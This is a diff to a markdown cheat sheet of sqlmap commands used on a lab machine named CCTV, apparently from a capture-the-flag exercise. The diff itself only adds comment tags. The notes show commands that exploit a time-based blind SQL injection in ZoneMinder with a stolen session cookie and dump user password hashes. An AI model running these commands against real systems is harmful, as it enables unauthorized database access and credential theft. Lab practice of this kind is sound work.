@@ -5,6 +5,7 @@ Automated SQL injection exploitation tool. Detects and exploits SQL injection fl
 ## Commands Used
 
 ### Confirm time-based blind SQLi in ZoneMinder
+<!-- cmd: linux -->
 ```bash
 sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
   --cookie="ZMSESSID=ug8b106p7l2uv9a4mk0nrbre8o" \
@@ -18,6 +19,7 @@ Used on: **CCTV**
 - `--cookie` — reuse the authenticated session cookie
 
 ### Dump users and password hashes
+<!-- cmd: linux -->
 ```bash
 sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
   -D zm -T Users -C Username,Password --dump --batch \
@@ -32,6 +34,7 @@ Used on: **CCTV**
 - `--time-sec=2` — delay threshold used for inference
 
 ### General enumeration helpers
+<!-- cmd: linux -->
 ```bash
 sqlmap -u "<URL>" --cookie="<COOKIE>" -p tid --dbms=mysql --batch --dbs
 sqlmap -u "<URL>" --cookie="<COOKIE>" -p tid --dbms=mysql --batch -D zm --tables
